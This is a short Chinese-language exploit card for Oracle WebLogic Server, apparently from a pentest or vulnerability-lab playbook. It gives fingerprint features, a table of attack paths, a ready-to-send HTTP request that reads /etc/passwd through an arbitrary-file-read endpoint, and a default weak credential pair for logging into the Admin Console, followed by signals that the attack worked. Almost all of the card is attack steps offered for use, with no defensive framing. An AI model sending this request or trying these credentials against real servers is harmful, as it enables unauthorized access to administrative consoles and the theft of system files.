# WebLogic 弱口令/文件读取 (weak_password)

## 指纹特征
- 服务: Oracle WebLogic Server
- 典型场景: Admin Console 弱口令 或 存在任意文件读取接口

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 后台弱口令 | `/console/login` | 无 |
| 任意文件读取 | `/hello/file.jsp?path=/etc/passwd` | 无 |

## PoC 指令

**1. 任意文件读取**
```http
GET /hello/file.jsp?path=/etc/passwd HTTP/1.1
Host: {{TARGET}}:7001
```

**2. 弱口令登录**
尝试使用常见弱口令（如 `weblogic:Oracle@123`）登录 Admin Console。

## Success Signal
- **文件读取**: 响应 Body 包含读取到的文件内容 (如 `/etc/passwd`)。
- **状态验证**: 弱口令成功登录管理后台。
